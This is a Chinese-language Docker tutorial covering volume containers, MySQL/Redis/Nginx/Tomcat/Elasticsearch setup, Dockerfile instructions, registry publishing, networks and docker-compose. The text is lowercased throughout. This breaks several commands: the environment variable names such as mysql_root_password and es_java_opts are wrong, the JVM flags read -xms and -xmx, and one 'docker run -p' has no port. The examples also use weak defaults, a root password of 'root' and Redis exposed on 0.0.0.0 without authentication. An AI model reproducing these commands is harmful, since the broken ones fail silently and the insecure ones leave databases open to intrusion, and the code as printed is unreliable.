命名的容器挂载数据卷，其它容器通过挂载这个(父容器)实现数据共享，挂载数据卷的容器，称之为数据卷容器\n\n创建父容器\n\ndocker run -ti --name dc01 jm/jm_centos:1.0\n\n\n1\n\n\n创建子容器\n\ndocker run -ti --name dc02 --volumes-from dc01 jm/jm_centos:1.0\n\n\n1\n\n\n子容器和父容器共享数据卷，当父容器删除时，子容器内容不会删除。可以理解为容器和数据卷分离，容器没了，数据卷还在。\n\n\n# docker安装常见的服务\n\n\n# docker 安装 mysql\n\n# 1.拉取mysql镜像到本地\ndocker pull mysql:tag (tag不加默认最新版本)\n\n# 2.运行mysql服务\ndocker run --name mysql -e mysql_root_password=root -d mysql:tag  \t\t\t\t\t\t  --没有暴露外部端口外部不能连接\ndocker run --name mysql -e mysql_root_password=root -p 3306:3306 -d  mysql:tag  --没有暴露外部端口\n\n# 3.进入mysql容器\ndocker exec -it 容器名称|容器id bash\n\n# 4.外部查看mysql日志\ndocker logs 容器名称|容器id\n\n# 5.使用自定义配置参数\ndocker run --name mysql -v /root/mysql/conf.d:/etc/mysql/conf.d -e mysql_root_password=root -d mysql:tag\n\n# 6.将容器数据位置与宿主机位置挂载保证数据安全\ndocker run --name mysql -v /root/mysql/data:/var/lib/mysql -v /root/mysql/conf.d:/etc/mysql/conf.d -e mysql_root_password=root -p 3306:3306 -d mysql:tag\n\n# 7.通过其他客户端访问 如在window系统|macos系统使用客户端工具访问\n\n# 8.将mysql数据库备份为sql文件\ndocker exec mysql|容器id sh -c \'exec mysqldump --all-databases -uroot -p"$mysql_root_password"\' > /root/all-databases.sql  --导出全部数据\ndocker exec mysql sh -c \'exec mysqldump --databases 库表 -uroot -p"$mysql_root_password"\' > /root/all-databases.sql  --导出指定库数据\ndocker exec mysql sh -c \'exec mysqldump --no-data --databases 库表 -uroot -p"$mysql_root_password"\' > /root/all-databases.sql  --导出指定库数据不要数据\n\n# 9.执行sql文件到mysql中\ndocker exec -i mysql sh -c \'exec mysql -uroot -p"$mysql_root_password"\' < /root/xxx.sql\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# docker安装redis\n\n# 1.在docker hub搜索redis镜像\ndocker search redis\n\n# 2.拉取redis镜像到本地\ndocker pull redis\n\n# 3.启动redis服务运行容器\ndocker run --name redis -d redis:tag (没有暴露外部端口)\ndocker run --name redis -p 6379:6379 -d redis:tag (暴露外部宿主机端口为6379进行连接) \n\n# 4.查看启动日志\ndocker logs -t -f 容器id|容器名称\n\n# 5.进入容器内部查看\ndocker exec -it 容器id|名称 bash  \n\n# 6.加载外部自定义配置启动redis容器\n默认情况下redis官方镜像中没有redis.conf配置文件 需要去官网下载指定版本的配置文件\n1. wget http://download.redis.io/releases/redis-5.0.8.tar.gz  下载官方安装包\n2. 将官方安装包中配置文件进行复制到宿主机指定目录中如 /root/redis/redis.conf文件\n3. 修改需要自定义的配置\nbind 0.0.0.0 开启远程权限\nappenonly yes 开启aof持久化\n4. 加载配置启动\ndocker run --name redis -v /root/redis:/usr/local/etc/redis -p 6379:6379 -d redis redis-server /usr/local/etc/redis/redis.conf  \n\n# 7.将数据目录挂在到本地保证数据安全\ndocker run --name redis -v /root/redis/data:/data -v /root/redis/redis.conf:/usr/local/etc/redis/redis.conf -p 6379:6379 -d redis redis-server \t\t\t\t\t/usr/local/etc/redis/redis.conf  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# docker 安装 nginx\n\n# 1.在docker hub搜索nginx\ndocker search nginx\n\n# 2.拉取nginx镜像到本地\n[root@localhost ~]# docker pull nginx\nusing default tag: latest\nlatest: pulling from library/nginx\nafb6ec6fdc1c: pull complete \nb90c53a0b692: pull complete \n11fa52a0fdc0: pull complete \ndigest: sha256:30dfa439718a17baafefadf16c5e7c9d0a1cde97b4fd84f63b69e13513be7097\nstatus: downloaded newer image for nginx:latest\ndocker.io/library/nginx:latest\n\n# 3.启动nginx容器\ndocker run -p 80:80 --name nginx01 -d nginx\n\n# 4.进入容器\ndocker exec -it nginx01 /bin/bash\n查找目录:  whereis nginx\n配置文件:  /etc/nginx/nginx.conf\n\n# 5.复制配置文件到宿主机\ndocker cp nginx01(容器id|容器名称):/etc/nginx/nginx.conf 宿主机名录\n\n# 6.挂在nginx配置以及html到宿主机外部\ndocker run --name nginx02 -v /root/nginx/nginx.conf:/etc/nginx/nginx.conf -v /root/nginx/html:/usr/share/nginx/html -p 80:80 -d nginx\t\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# docker 安装 tomcat\n\n# 1.在docker hub搜索tomcat\ndocker search tomcat\n\n# 2.下载tomcat镜像\ndocker pull tomcat\n\n# 3.运行tomcat镜像\ndocker run -p 8080:8080 -d --name mytomcat tomcat\n\n# 4.进入tomcat容器\ndocker exec -it mytomcat /bin/bash\n\n# 5.将webapps目录挂载在外部\ndocker run -p 8080:8080 -v /root/webapps:/usr/local/tomcat/webapps -d --name mytomcat tomcat\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# docker 安装 es\n\n# 0. 拉取镜像 启动容器\n\n# 1.dockerhub 拉取镜像\n\tdocker pull elasticsearch:6.4.2\n# 2.查看docker镜像\n\tdocker images\n# 3.运行docker镜像\n\tdocker run -p 9200:9200 -p 9300:9300 elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n\n# 1. 进行相关的配置\n\n# 1.在centos虚拟机中，修改配置sysctl.conf\n\tvim /etc/sysctl.conf\n# 2.加入如下配置\n\tvm.max_map_count=262144 \n# 3.启用配置\n\tsysctl -p\n\t注：这一步是为了防止启动容器时，报出如下错误：\n\tbootstrap checks failed max virtual memory areas vm.max_map_count [65530] likely too low, increase to at least [262144]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# 2. 启动容器\n\n# 0.复制容器中data目录到宿主机中\ndocker cp 容器id:/usr/share/share/elasticsearch/data /root/es\n# 1.运行es容器 指定jvm内存大小并指定ik分词器位置\ndocker run -d --name es -p 9200:9200 -p 9300:9300 -e es_java_opts="-xms128m -xmx128m" -v /root/es/plugins:/usr/share/elasticsearch/plugins -v /root/es/data:/usr/share/elasticsearch/data elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n\n\n# 3.安装ik分词器\n\n# 1.下载对应版本的ik分词器\nwget https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v6.4.2/elasticsearch-analysis-ik-6.4.2.zip\n\n# 2.解压到plugins文件夹中\nyum install -y unzip\nunzip -d ik elasticsearch-analysis-ik-6.4.2.zip\n\n# 3.添加自定义扩展词和停用词\ncd plugins/elasticsearch/config\nvim ikanalyzer.cfg.xml\n<properties>\n<comment>ik analyzer 扩展配置</comment>\n\x3c!--用户可以在这里配置自己的扩展字典 --\x3e\n<entry key="ext_dict">ext_dict.dic</entry>\n\x3c!--用户可以在这里配置自己的扩展停止词字典--\x3e\n<entry key="ext_stopwords">ext_stopwords.dic</entry>\n</properties>\n\n# 4.在ik分词器目录下config目录中创建ext_dict.dic文件   编码一定要为utf-8才能生效\nvim ext_dict.dic 加入扩展词即可\n# 5. 在ik分词器目录下config目录中创建ext_stopword.dic文件 \nvim ext_stopwords.dic 加入停用词即可\n\n# 6.重启容器生效\ndocker restart 容器id\n# 7.将此容器提交成为一个新的镜像\ndocker commit -a="xiaochen" -m="es with ikanalyzer" 容器id xiaochen/elasticsearch:6.4.2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n# 4. 安装kibana\n\n# 1.下载kibana镜像到本地\ndocker pull kibana:6.4.2\n\n# 2.启动kibana容器\ndocker run -d --name kibana -e elasticsearch_url=http://10.15.0.3:9200 -p 5601:5601 kibana:6.4.2\n\n\n1\n2\n3\n4\n5\n\n\n\n# docker 常见问题处置\n\n[root@localhost ~]# docker search mysql 或者 docker pull 这些命令无法使用\nerror response from daemon: get https://index.docker.io/v1/search?q=mysql&n=25: x509: certificate has expired or is not yet valid\n\n\n1\n2\n\n\n\n\n注意:这个错误的原因在于是系统的时间和docker hub时间不一致,需要做系统时间与网络时间同步\n\n# 1.安装时间同步\n\tsudo yum -y install ntp ntpdate\n# 2.同步时间\n\tsudo ntpdate cn.pool.ntp.org\n# 3.查看本机时间\n\tdate\n# 4.从新测试\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# dockerfile\n\n> dockerfile是用来构建docker镜像的构建文件，是由一系列命令和参数构成的脚本。\n\n\n# 什么是dockerfile\n\ndockerfile可以认为是docker镜像的描述文件，是由一系列命令和参数构成的脚本。主要作用是用来构建docker镜像的构建文件。\n\n\n\n * 通过架构图可以看出通过dockerfile可以直接构建镜像\n\n\n# dockerfile解析过程\n\n\n\n\n# dockerfile的保留命令\n\n官方说明:https://docs.docker.com/engine/reference/builder/\n\n保留字          作用\nfrom         当前镜像是基于哪个镜像的 第一个指令必须是from\nmaintainer   镜像维护者的姓名和邮箱地址\nrun          构建镜像时需要运行的指令\nexpose       当前容器对外暴露出的端口号\nworkdir      指定在创建容器后，终端默认登录进来的工作目录，一个落脚点\nenv          用来在构建镜像过程中设置环境变量\nadd          将宿主机目录下的文件拷贝进镜像且add命令会自动处理url和解压tar包\ncopy         类似于add，拷贝文件和目录到镜像中\n             将从构建上下文目录中<原路径>的文件/目录复制到新的一层的镜像内的<目标路径>位置\nvolume       容器数据卷，用于数据保存和持久化工作\ncmd          指定一个容器启动时要运行的命令\n             dockerfile中可以有多个cmd指令，但只有最后一个生效，cmd会被docker run之后的参数替换\nentrypoint   指定一个容器启动时要运行的命令\n             entrypoint的目的和cmd一样，都是在指定容器启动程序及其参数\n\n# from\n\n * 基于那个镜像进行构建新的镜像,在构建时会自动从docker hub拉取base镜像 必须作为dockerfile的第一个指令出现\n\n * 语法:\n   \n   from  <image>\n   from  <image>[:<tag>]     使用版本不写为latest\n   from  <image>[@<digest>]  使用摘要\n   \n   \n   1\n   2\n   3\n   \n\n# maintainer\n\n * 镜像维护者的姓名和邮箱地址[废弃]\n\n * 语法:\n   \n   maintainer <name>\n   \n   \n   1\n   \n\n# run\n\n * run指令将在当前映像之上的新层中执行任何命令并提交结果。生成的提交映像将用于dockerfile中的下一步\n\n * 语法:\n   \n   run <command> (shell form, the command is run in a shell, which by default is /bin/sh -c on linux or cmd /s /c on windows)\n   run echo hello\n   \n   run ["executable", "param1", "param2"] (exec form)\n   run ["/bin/bash", "-c", "echo hello"]\n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n# expose\n\n * 用来指定构建的镜像在运行为容器时对外暴露的端口\n\n * 语法:\n   \n   expose 80/tcp  如果没有显示指定则默认暴露都是tcp\n   expose 80/udp\n   \n   \n   1\n   2\n   \n\n# cmd\n\n * 用来为启动的容器指定执行的命令,在dockerfile中只能有一条cmd指令。如果列出多个命令，则只有最后一个命令才会生效。\n\n * 注意: dockerfile中只能有一条cmd指令。如果列出多个命令，则只有最后一个命令才会生效。\n\n * 语法:\n   \n   cmd ["executable","param1","param2"] (exec form, this is the preferred form)\n   cmd ["param1","param2"] (as default parameters to entrypoint)\n   cmd command param1 param2 (shell form)\n   \n   \n   1\n   2\n   3\n   \n\n# workdir\n\n * 用来为dockerfile中的任何run、cmd、entrypoint、copy和add指令设置工作目录。如果workdir不存在，即使它没有在任何后续dockerfile指令中使用，它也将被创建。\n\n * 语法:\n   \n   workdir /path/to/workdir\n   \n   workdir /a\n   workdir b\n   workdir c\n   `注意:workdir指令可以在dockerfile中多次使用。如果提供了相对路径，则该路径将与先前workdir指令的路径相对`\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n\n# env\n\n * 用来为构建镜像设置环境变量。这个值将出现在构建阶段中所有后续指令的环境中。\n\n * 语法：\n   \n   env <key> <value>\n   env <key>=<value> ...\n   \n   \n   1\n   2\n   \n\n# add\n\n * 用来从context上下文复制新文件、目录或远程文件url，并将它们添加到位于指定路径的映像文件系统中。\n\n * 语法:\n   \n   add hom* /mydir/       通配符添加多个文件\n   add hom?.txt /mydir/   通配符添加\n   add test.txt relativedir/  可以指定相对路径\n   add test.txt /absolutedir/ 也可以指定绝对路径\n   add url \n   \n   \n   1\n   2\n   3\n   4\n   5\n   \n\n# copy\n\n * 用来将context目录中指定文件复制到镜像的指定目录中\n\n * 语法:\n   \n   copy src dest\n   copy ["<src>",... "<dest>"]\n   \n   \n   1\n   2\n   \n\n# volume\n\n * 用来定义容器运行时可以挂在到宿主机的目录\n\n * 语法:\n   \n   volume ["/data"]\n   \n   \n   1\n   \n\n# entrypoint\n\n * 用来指定容器启动时执行命令和cmd类似\n\n * 语法:\n   \n     ["executable", "param1", "param2"]\n   entrypoint command param1 param2\n   \n   \n   1\n   2\n   \n   \n   entrypoint指令，往往用于设置容器启动后的第一个命令，这对一个容器来说往往是固定的。 cmd指令，往往用于设置容器启动的第一个命令的默认参数，这对一个容器来说可以是变化的。\n\n# onbuild\n\n触发器，当构建一个被继承的dockerfile时运行的命令，父镜像在被子镜像集成之后，onbuild被触发\n\n\n\n\n# dockerfile 打包 springboot项目\n\n# 0. 打包本地项目\n\n\n\n# 1. 将可运行项目放入linux虚拟机中\n\n\n\n# 3. 编写dockerfile\n\nfrom openjdk:8\nworkdir /ems\nadd ems.jar /ems\nexpose 8989\nentrypoint ["java","-jar"]\ncmd ["ems.jar"]\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 4. 构建运行\n\n[root@localhost ems]# docker build -t ems .\n[root@localhost ems]# docker run -p 8989:8989 ems\n\n\n1\n2\n\n\n\n# 本地镜像发布\n\n<https://cr.console.aliyun.com/cn-beijing/instance/repositories>\n\n\n1\n\n\n\n\n1. 登录阿里云docker registry $ sudo docker login --username=153****2135 registry.cn-beijing.aliyuncs.com\n\n用于登录的用户名为阿里云账号全名，密码为开通服务时设置的密码。 您可以在访问凭证页面修改凭证密码。\n\n\n# 2. 从registry中拉取镜像\n\n$ sudo docker pull registry.cn-beijing.aliyuncs.com/csbugless/test:[镜像版本号]\n\n\n1\n\n\n\n# 3. 将镜像推送到registry\n\n$ sudo docker login --username=153****2135 registry.cn-beijing.aliyuncs.com\n$ sudo docker tag [imageid] registry.cn-beijing.aliyuncs.com/csbugless/test:[镜像版本号]\n$ sudo docker push registry.cn-beijing.aliyuncs.com/csbugless/test:[镜像版本号]\n\n\n1\n2\n3\n\n\n请根据实际镜像信息替换示例中的[imageid]和[镜像版本号]参数。\n\n\n# 4. 选择合适的镜像仓库地址\n\n从ecs推送镜像时，可以选择使用镜像仓库内网地址。推送速度将得到提升并且将不会损耗您的公网流量。\n\n如果您使用的机器位于vpc网络，请使用 registry-vpc.cn-beijing.aliyuncs.com 作为registry的域名登录。\n\n\n# 5. 示例\n\n使用"docker tag"命令重命名镜像，并将它通过专有网络地址推送至registry。\n\n$ sudo docker imagesrepository                                                         tag                 image id            created             virtual sizeregistry.aliyuncs.com/acs/agent                                    0.7-dfb6816         37bb9c63c8b2        7 days ago          37.89 mb$ sudo docker tag 37bb9c63c8b2 registry-vpc.cn-beijing.aliyuncs.com/acs/agent:0.7-dfb6816\n\n\n1\n\n\n使用 "docker push" 命令将该镜像推送至远程。\n\n$ sudo docker push registry-vpc.cn-beijing.aliyuncs.com/acs/agent:0.7-dfb6816\n\n\n1\n\n\n\n# 高级网络和容器卷\n\n\n# 高级网络配置\n\n# 说明\n\n当 docker 启动时，会自动在主机上创建一个 docker0 虚拟网桥，实际上是 linux 的一个 bridge，可以理解为一个软件交换机。它会在挂载到它的网口之间进行转发。\n\n同时，docker 随机分配一个本地未占用的私有网段（在 rfc1918 中定义）中的一个地址给 docker0 接口。比如典型的 172.17.42.1，掩码为 255.255.0.0。此后启动的容器内的网口也会自动分配一个同一网段（172.17.0.0/16）的地址。\n\n当创建一个 docker 容器的时候，同时会创建了一对 veth pair 接口（当数据包发送到一个接口时，另外一个接口也可以收到相同的数据包）。这对接口一端在容器内，即 eth0；另一端在本地并被挂载到 docker0 网桥，名称以 veth 开头（例如 vethaqi2qt）。通过这种方式，主机可以跟容器通信，容器之间也可以相互通信。docker 就创建了在主机和所有容器之间一个虚拟共享网络。\n\n\n\n# 查看网络信息\n\n# docker network ls\n\n\n1\n\n\n# 创建一个网桥\n\n# docker network create -d bridge 网桥名称\n\n\n1\n\n\n# 删除一个网桥\n\n# docker network rm 网桥名称\n\n\n1\n\n\n# 容器之前使用网络通信\n\n# 1.查询当前网络配置\n- docker network ls\nnetwork id          name                driver              scope\n8e424e5936b7        bridge              bridge              local\n17d974db02da        docker_gwbridge     bridge              local\nd6c326e433f7        host                host                local\n# 2.创建桥接网络\n- docker network create -d bridge info\n[root@centos ~]# docker network create -d bridge info\n6e4aaebff79b1df43a064e0e8fdab08f52d64ce34db78dd5184ce7aaaf550a2f\n[root@centos ~]# docker network ls\nnetwork id          name                driver              scope\n8e424e5936b7        bridge              bridge              local\n17d974db02da        docker_gwbridge     bridge              local\nd6c326e433f7        host                host                local\n6e4aaebff79b        info                bridge              local\n# 3.启动容器指定使用网桥\n- docker run -d -p 8890:80 --name nginx001 --network info nginx \n- docker run -d -p 8891:80 --name nginx002 --network info nginx \n注意:一旦指定网桥后--name指定名字就是主机名,多个容器指定在同一个网桥时,可以在任意一个容器中使用主机名与容器进行互通\n[root@centos ~]# docker run -d -p 8890:80 --name nginx001 --network info nginx \nc315bcc94e9ddaa36eb6c6f16ca51592b1ac8bf1ecfe9d8f01d892f3f10825fe\n[root@centos ~]# docker run -d -p 8891:80 --name nginx002 --network info nginx\nf8682db35dd7fb4395f90edb38df7cad71bbfaba71b6a4c6e2a3a525cb73c2a5\n[root@centos ~]# docker ps\ncontainer id        image               command                  created             status              ports                  names\nf8682db35dd7        nginx               "/docker-entrypoint.…"   3 seconds ago       up 2 seconds        0.0.0.0:8891->80/tcp   nginx002\nc315bcc94e9d        nginx               "/docker-entrypoint.…"   7 minutes ago       up 7 minutes        0.0.0.0:8890->80/tcp   nginx001\nb63169d43792        mysql:5.7.19        "docker-entrypoint.s…"   7 minutes ago       up 7 minutes        3306/tcp               mysql_mysql.1.s75qe5kkpwwttyf0wrjvd2cda\n[root@centos ~]# docker exec -it f8682db35dd7 /bin/bash\nroot@f8682db35dd7:/# curl http://nginx001\n<!doctype html>\n<html>\n<head>\n<title>welcome to nginx!</title>\n.....\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\n\n# 高级数据卷配置\n\n# 说明\n\n数据卷 是一个可供一个或多个容器使用的特殊目录，它绕过 ufs，可以提供很多有用的特性：\n\n * 数据卷 可以在容器之间共享和重用\n * 对 数据卷 的修改会立马生效\n * 对 数据卷 的更新，不会影响镜像\n * 数据卷 默认会一直存在，即使容器被删除\n\n> 注意：数据卷 的使用，类似于 linux 下对目录或文件进行 mount，镜像中的被指定为挂载点的目录中的文件会复制到数据卷中（仅数据卷为空时会复制）。\n\n# 创建数据卷\n\n[root@centos ~]# docker volume create my-vol\nmy-vol\n\n\n1\n2\n\n\n# 查看数据卷\n\n[root@centos ~]# docker volume inspect my-vol       \n[\n    {\n        "createdat": "2020-11-25t11:43:56+08:00",\n        "driver": "local",\n        "labels": {},\n        "mountpoint": "/var/lib/docker/volumes/my-vol/_data",\n        "name": "my-vol",\n        "options": {},\n        "scope": "local"\n    }\n]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# 挂载数据卷\n\n[root@centos ~]# docker run -d -p --name web  -v my-vol:/usr/share/nginx/html  nginx\n[root@centos ~]# docker inspect web\n\t\t\t\t"mounts": [\n            {\n                "type": "volume",\n                "name": "my-vol",\n                "source": "/var/lib/docker/volumes/my-vol/_data",\n                "destination": "/usr/share/nginx/html",\n                "driver": "local",\n                "mode": "z",\n                "rw": true,\n                "propagation": ""\n            }\n        ],\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# 删除数据卷\n\ndocker volume rm my-vol\n\n\n1\n\n\n\n# docker compose\n\n\n# docker compose使用\n\n# 1.相关概念\n\n首先介绍几个术语。\n\n * 服务 (service)：一个应用容器，实际上可以运行多个相同镜像的实例。\n * 项目 (project)：由一组关联的应用容器组成的一个完整业务单元。∂一个项目可以由多个服务（容器）关联而成，compose 面向项目进行管理。\n\n# 2.场景\n\n最常见的项目是 web 网站，该项目应该包含 web 应用和缓存。\n\n * springboot应用\n * mysql服务\n * redis服务\n * elasticsearch服务\n * .......\n\n# 3.docker-compose模板\n\n * 参考文档:https://docker_practice.gitee.io/zh-cn/compose/compose_file.html\n\nversion: "3.0"\nservices:\n  mysqldb:\n    image: mysql:5.7.19\n    container_name: mysql\n    ports:\n      - "3306:3306"\n    volumes:\n      - /root/mysql/conf:/etc/mysql/conf.d\n      - /root/mysql/logs:/logs\n      - /root/mysql/data:/var/lib/mysql\n    environment:\n      mysql_root_password: root\n    networks:\n      - ems\n    depends_on:\n      - redis\n\n  redis:\n    image: redis:4.0.14\n    container_name: redis\n    ports:\n      - "6379:6379"\n    networks:\n      - ems\n    volumes:\n      - /root/redis/data:/data\n    command: redis-server\n    \nnetworks:\n  ems:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n# 4.通过docker-compose运行一组容器\n\n * 参考文档:https://docker_practice.gitee.io/zh-cn/compose/commands.html\n\n[root@centos ~]# docker-compose up    \t\t\t\t\t\t\t//前台启动一组服务\n[root@centos ~]# docker-compose up -d \t\t\t\t\t\t\t//后台启动一组服务\n\n\n1\n2\n\n\n----------------------------------------\n\n\n# docker-compose 模板文件\n\n模板文件是使用 compose 的核心，涉及到的指令关键字也比较多。但大家不用担心，这里面大部分指令跟 docker run 相关参数的含义都是类似的。\n\n默认的模板文件名称为 docker-compose.yml，格式为 yaml 格式。\n\nversion: "3"\n\nservices:\n  webapp:\n    image: examples/web\n    ports:\n      - "80:80"\n    volumes:\n      - "/data"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n注意每个服务都必须通过 image 指令指定镜像或 build 指令（需要 dockerfile）等来自动构建生成镜像。\n\n如果使用 build 指令，在 dockerfile 中设置的选项(例如：cmd, expose, volume, env 等) 将会自动被获取，无需在 docker-compose.yml 中重复设置。\n\n下面分别介绍各个指令的用法。\n\n# build\n\n指定 dockerfile 所在文件夹的路径（可以是绝对路径，或者相对 docker-compose.yml 文件的路径）。 compose 将会利用它自动构建这个镜像，然后使用这个镜像。\n\nversion: \'3\'\nservices:\n\n  webapp:\n    build: ./dir\n\n\n1\n2\n3\n4\n5\n\n\n你也可以使用 context 指令指定 dockerfile 所在文件夹的路径。\n\n使用 dockerfile 指令指定 dockerfile 文件名。\n\n使用 arg 指令指定构建镜像时的变量。\n\nversion: \'3\'\nservices:\n\n  webapp:\n    build:\n      context: ./dir\n      dockerfile: dockerfile-alternate\n      args:\n        buildno: 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# command\n\n覆盖容器启动后默认执行的命令。\n\ncommand: echo "hello world"\n\n\n1\n\n\n# container_name\n\n指定容器名称。默认将会使用 项目名称_服务名称_序号 这样的格式。\n\ncontainer_name: docker-web-container\n\n\n1\n\n\n> 注意: 指定容器名称后，该服务将无法进行扩展（scale），因为 docker 不允许多个容器具有相同的名称。\n\n# depends_on\n\n解决容器的依赖、启动先后的问题。以下例子中会先启动 redis db 再启动 web\n\nversion: \'3\'\n\nservices:\n  web:\n    build: .\n    depends_on:\n      - db\n      - redis\n\n  redis:\n    image: redis\n\n  db:\n    image: postgres\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n> 注意：web 服务不会等待 redis db 「完全启动」之后才启动。\n\n# env_file\n\n从文件中获取环境变量，可以为单独的文件路径或列表。\n\n如果通过 docker-compose -f file 方式来指定 compose 模板文件，则 env_file 中变量的路径会基于模板文件路径。\n\n如果有变量名称与 environment 指令冲突，则按照惯例，以后者为准。\n\nenv_file: .env\n\nenv_file:\n  - ./common.env\n  - ./apps/web.env\n  - /opt/secrets.env\n\n\n1\n2\n3\n4\n5\n6\n\n\n环境变量文件中每一行必须符合格式，支持 # 开头的注释行。\n\n# common.env: set development environment\nprog_env=development\n\n\n1\n2\n\n\n# environment\n\n设置环境变量。你可以使用数组或字典两种格式。\n\n只给定名称的变量会自动获取运行 compose 主机上对应变量的值，可以用来防止泄露不必要的数据。\n\nenvironment:\n  rack_env: development\n  session_secret:\n\nenvironment:\n  - rack_env=development\n  - session_secret\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n如果变量名称或者值中用到 true|false，yes|no 等表达 布尔 含义的词汇，最好放到引号里，避免 yaml 自动解析某些内容为对应的布尔语义。这些特定词汇，包括\n\ny|y|yes|yes|yes|n|n|no|no|no|true|true|true|false|false|false|on|on|on|off|off|off\n\n\n1\n\n\n# healthcheck\n\n通过命令检查容器是否健康运行。\n\nhealthcheck:\n  test: ["cmd", "curl", "-f", "http://localhost"]\n  interval: 1m30s\n  timeout: 10s\n  retries: 3\n\n\n1\n2\n3\n4\n5\n\n\n# image\n\n指定为镜像名称或镜像 id。如果镜像在本地不存在，compose 将会尝试拉取这个镜像。\n\nimage: ubuntu\nimage: orchardup/postgresql\nimage: a4bc65fd\n\n\n1\n2\n3\n\n\n# networks\n\n配置容器连接的网络。\n\nversion: "3"\nservices:\n\n  some-service:\n    networks:\n     - some-network\n     - other-network\n\nnetworks:\n  some-network:\n  other-network:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n# ports\n\n暴露端口信息。\n\n使用宿主端口：容器端口 (host:container) 格式，或者仅仅指定容器的端口（宿主将会随机选择端口）都可以。\n\nports:\n - "3000"\n - "8000:8000"\n - "49100:22"\n - "127.0.0.1:8001:8001"\n\n\n1\n2\n3\n4\n5\n\n\n注意：当使用 host:container 格式来映射端口时，如果你使用的容器端口小于 60 并且没放到引号里，可能会得到错误结果，因为 yaml 会自动解析 xx:yy 这种数字格式为 60 进制。为避免出现这种问题，建议数字串都采用引号包括起来的字符串格式。\n\n# sysctls\n\n配置容器内核参数。\n\nsysctls:\n  net.core.somaxconn: 1024\n  net.ipv4.tcp_syncookies: 0\n\nsysctls:\n  - net.core.somaxconn=1024\n  - net.ipv4.tcp_syncookies=0\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# ulimits\n\n指定容器的 ulimits 限制值。\n\n例如，指定最大进程数为 65535，指定文件句柄数为 20000（软限制，应用可以随时修改，不能超过硬限制） 和 40000（系统硬限制，只能 root 用户提高）。\n\n  ulimits:\n    nproc: 65535\n    nofile:\n      soft: 20000\n      hard: 40000\n\n\n1\n2\n3\n4\n5\n\n\n# volumes\n\n数据卷所挂载路径设置。可以设置为宿主机路径(host:container)或者数据卷名称(volume:container)，并且可以设置访问模式 （host:container:ro）。\n\n该指令中路径支持相对路径。\n\nvolumes:\n - /var/lib/mysql\n - cache/:/tmp/cache\n - ~/configs:/etc/configs/:ro\n\n\n1\n2\n3\n4\n\n\n如果路径为数据卷名称，必须在文件中配置数据卷。\n\nversion: "3"\n\nservices:\n  my_src:\n    image: mysql:8.0\n    volumes:\n      - mysql_data:/var/lib/mysql\n\nvolumes:\n  mysql_data:\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n----------------------------------------\n\n\n# docker-compose 常用命令\n\n# 1. 命令对象与格式\n\n对于 compose 来说，大部分命令的对象既可以是项目本身，也可以指定为项目中的服务或者容器。如果没有特别的说明，命令对象将是项目，这意味着项目中所有的服务都会受到命令影响。\n\n执行 docker-compose [command] --help 或者 docker-compose help [command] 可以查看具体某个命令的使用格式。\n\ndocker-compose 命令的基本的使用格式是\n\ndocker-compose [-f=<arg>...] [options] [command] [args...]\n\n\n1\n\n\n# 2. 命令选项\n\n * -f, --file file 指定使用的 compose 模板文件，默认为 docker-compose.yml，可以多次指定。\n * -p, --project-name name 指定项目名称，默认将使用所在目录名称作为项目名。\n * --x-networking 使用 docker 的可拔插网络后端特性\n * --x-network-driver driver 指定网络后端的驱动，默认为 bridge\n * --verbose 输出更多调试信息。\n * -v, --version 打印版本并退出。\n\n# 3.命令使用说明\n\n# up\n\n格式为 docker-compose up [options] [service...]。\n\n * 该命令十分强大，它将尝试自动完成包括构建镜像，（重新）创建服务，启动服务，并关联服务相关容器的一系列操作。\n\n * 链接的服务都将会被自动启动，除非已经处于运行状态。\n\n * 可以说，大部分时候都可以直接通过该命令来启动一个项目。\n\n * 默认情况，docker-compose up 启动的容器都在前台，控制台将会同时打印所有容器的输出信息，可以很方便进行调试。\n\n * 当通过 ctrl-c 停止命令时，所有容器将会停止。\n\n * 如果使用 docker-compose up -d，将会在后台启动并运行所有的容器。一般推荐生产环境下使用该选项。\n\n * 默认情况，如果服务容器已经存在，docker-compose up 将会尝试停止容器，然后重新创建（保持使用 volumes-from 挂载的卷），以保证新启动的服务匹配 docker-compose.yml 文件的最新内容\n\n----------------------------------------\n\n# down\n\n * 此命令将会停止 up 